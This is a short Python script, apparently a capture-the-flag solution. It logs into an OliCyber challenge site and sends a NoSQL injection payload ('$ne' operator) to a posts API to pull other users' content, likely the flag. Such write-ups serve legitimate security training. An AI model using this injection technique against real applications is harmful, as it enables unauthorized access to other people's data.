#/usr/bin/env python3
import requests, json
site = "http://gabibbo_kontakte.challs.olicyber.it/"
payload = {"username":{"$ne":1}}
s = requests.Session()
s.post(site + "login", data={"username":"sas123sas", "password":"sas123sas"})
r = s.post(site + "api/posts", json=payload)
print(json.loads(r.text)[0]["content"])
